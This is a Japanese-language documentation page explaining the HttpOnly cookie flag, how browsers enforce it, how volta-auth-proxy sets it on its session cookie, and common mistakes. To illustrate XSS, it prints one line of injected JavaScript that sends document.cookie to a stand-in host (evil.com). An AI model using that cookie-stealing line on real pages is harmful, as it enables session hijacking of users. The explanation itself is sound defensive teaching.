# HttpOnly（Cookie フラグ）

## これは何？

HttpOnly とは、Cookie に設定できるフラグで、ブラウザに対して「この Cookie は HTTP リクエストでのみ送信してください。JavaScript からの読み取り、書き込み、存在の確認は許可しません」と指示するものです。

Cookie に HttpOnly フラグが設定されている場合、JavaScript で `document.cookie` を呼び出しても、その Cookie は結果に含まれません。ブラウザは条件に合う HTTP リクエスト（ページ読み込みや API コールなど）に Cookie を引き続き送信しますが、ページ上で動くスクリプトは Cookie に一切触れません。

`Set-Cookie` ヘッダではこのように設定します:

```
Set-Cookie: __volta_session=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

`HttpOnly` の部分がフラグです。JavaScript からはアクセスできません。以上。

## なぜ重要？

最大の理由: **セッション Cookie の XSS 対策。**

クロスサイトスクリプティング（XSS）は、攻撃者が Web ページ上で悪意のある JavaScript を実行させる攻撃です。HttpOnly がないと、その悪意あるスクリプトが最初にやることは:

```javascript
// 攻撃者が注入したスクリプト
fetch('https://evil.com/steal?cookie=' + document.cookie);
```

セッション Cookie が JavaScript で読み取れると、攻撃者はユーザーのセッションを入手できます。その Cookie を自分のブラウザに貼り付けて、アカウントを乗っ取れます。

HttpOnly がある場合:

```javascript
document.cookie
// 結果: "theme=dark; lang=en"
// セッション Cookie (__volta_session) は表示されない
// 攻撃者は有用な情報を得られない
```

セッション Cookie は JavaScript から見えません。見えないものは盗めません。

比較:

```
  HttpOnly なし:                    HttpOnly あり:

  ブラウザ                          ブラウザ
  +------------------+              +------------------+
  |  JavaScript:     |              |  JavaScript:     |
  |  document.cookie |              |  document.cookie |
  |  = "session=abc" |              |  = "theme=dark"  |
  |                  |              |                  |
  |  XSS でセッション  |              |  XSS はセッション  |
  |  を盗める！       |              |  を見られない      |
  +------------------+              +------------------+
  |  HTTP リクエスト:  |              |  HTTP リクエスト:  |
  |  Cookie: session |              |  Cookie: session |
  |  = abc           |              |  = abc           |
  +------------------+              +------------------+

  リクエストで Cookie 送信: はい     リクエストで Cookie 送信: はい
  JS から Cookie が見える: はい      JS から Cookie が見える: いいえ
```

## どう動くの？

サーバーが `Set-Cookie` ヘッダに `HttpOnly` を含めると、ブラウザは Cookie と一緒に HTTP-only であることを示すフラグを保存します。ブラウザは 2 つの方法でこれを強制します:

1. **`document.cookie` API。** ブラウザは `document.cookie` が返す文字列から HttpOnly Cookie を除外します。この API での HttpOnly Cookie の設定や変更も拒否します。

2. **JavaScript Cookie API。** 新しい `CookieStore` API（対応ブラウザ）も HttpOnly フラグを尊重し、これらの Cookie を公開しません。

Cookie は、Cookie のパス、ドメイン、その他の属性に一致する全ての HTTP リクエストの `Cookie` ヘッダに引き続き含まれます。サーバーは通常通り読み取れます。制限はクライアントサイドの JavaScript アクセスだけに適用されます。

重要: HttpOnly は Cookie がリクエストで送信されることを防ぎません。Cookie を暗号化するわけでもありません。ネットワークレベルの傍受を防ぐわけでもありません（それは `Secure` フラグの役割です）。具体的かつ唯一、JavaScript が Cookie の値を読み取ることを防ぎます。

## volta-auth-proxy ではどう使っている？

volta-auth-proxy はセキュリティの中核的な施策として、セッション Cookie に HttpOnly を設定しています。

**セッション Cookie。** ユーザーがログインすると、volta はサーバーサイドセッションを作成して Cookie を設定します:

```
Set-Cookie: __volta_session=<UUID>; Path=/; Max-Age=28800; HttpOnly; SameSite=Lax
```

Cookie に含まれるもの:
- `HttpOnly` -- JavaScript からアクセスできない
- `SameSite=Lax` -- 同一サイトのリクエストかトップレベルのナビゲーションでのみ送信
- `Secure` -- HTTPS 接続時に追加（平文 HTTP での送信を防止）
- `Max-Age=28800` -- 8 時間後に期限切れ（サーバーサイドのセッション TTL と一致）
- `Path=/` -- ドメインへの全てのリクエストで送信

**volta のアーキテクチャにおける重要性。** volta は認証ゲートウェイ（ForwardAuth）として下流のアプリケーションの前に位置しています。下流のアプリケーションには volta が制御できない XSS の脆弱性があるかもしれません。セッション Cookie が HttpOnly なので、下流のアプリに XSS のバグがあっても、攻撃者は volta のセッションを盗めません。

```
  下流アプリ (wiki.example.com)
  +--------------------------------+
  |  XSS の脆弱性がある！           |
  |                                |
  |  攻撃者のスクリプトが実行:       |
  |  document.cookie               |
  |  -> 結果: "wiki_pref=dark"     |
  |  -> __volta_session は          |
  |     見えない（HttpOnly）        |
  |                                |
  |  攻撃者は volta のセッションを    |
  |  盗めない                       |
  +--------------------------------+
```

**フラッシュ Cookie。** volta はフラッシュメッセージ（「Acme Corp に参加しました」など）に `__volta_flash` Cookie も使います。この Cookie には HttpOnly が設定されて**いません**。意図的に短命（Max-Age 20 秒）で、セキュリティに敏感なデータではなく UI メッセージだけを運ぶためです。

**CSRF トークン。** volta は CSRF トークンをサーバーサイドのセッションレコードに保存します（Cookie にではない）。HTML フォームに隠しフィールドとしてレンダリングされます。別途 CSRF Cookie を用意する必要がありません。

## よくある間違い

**1. セッション Cookie に HttpOnly を設定しない。**
これは保護すべき最も重要な Cookie です。1 つの Cookie にだけ HttpOnly を設定するなら、セッション Cookie であるべきです。全てのセッション Cookie に HttpOnly を。例外なし。

**2. HttpOnly が全ての Cookie 窃取を防ぐと思い込む。**
HttpOnly は JavaScript アクセスをブロックします。以下に対しては保護**しません**:
- ネットワーク傍受（これには `Secure` フラグ + HTTPS を使う）
- クロスサイトリクエストフォージェリ（これには `SameSite` フラグを使う）
- サーバーサイドの脆弱性（セッションテーブルを読む SQL インジェクションなど）

HttpOnly は防御の一層であり、唯一の層ではありません。

**3. JavaScript でセッション Cookie を読み書きする。**
アプリケーションが JavaScript で Cookie にアクセスする必要がある場合、その Cookie は HttpOnly にできません。一部のフレームワークが JWT トークンを localStorage に入れる（JS が読めるように）のはこのためですが、それでは XSS に脆弱になります。より良いパターンは volta のアプローチ: セッションを HttpOnly Cookie に保持し、短命の JWT をサーバーサイドで発行する。

**4. 正当に JS アクセスが必要な Cookie にも HttpOnly を設定する。**
テーマの好み Cookie（`theme=dark`）や言語 Cookie（`lang=en`）はクライアントサイドの JavaScript が読む必要があるかもしれません。それらには HttpOnly は不要です。ルール: セッションと認証の Cookie には HttpOnly を。UI の好みの Cookie には不要な場合もある。

**5. HttpOnly で Cookie がデベロッパーツールから見えなくなると思い込む。**
HttpOnly Cookie はブラウザのデベロッパーツール（Application/Storage タブ）で引き続き見えます。HTTP レスポンスヘッダでも見えます。HttpOnly は JavaScript によるプログラム的なアクセスだけをブロックします。ユーザー（またはマシンへの物理アクセスを持つ攻撃者）はデベロッパーツールで見ることができます。

**6. HttpOnly を Secure と SameSite と組み合わせない。**
HttpOnly だけでは不十分です。以下も必要です:
- `Secure` -- Cookie が HTTPS でのみ送信されるように
- `SameSite=Lax`（または `Strict`）-- クロスサイトリクエストフォージェリを防止

volta のセッション Cookie は多層防御のために 3 つのフラグ全てを組み合わせて使用しています。
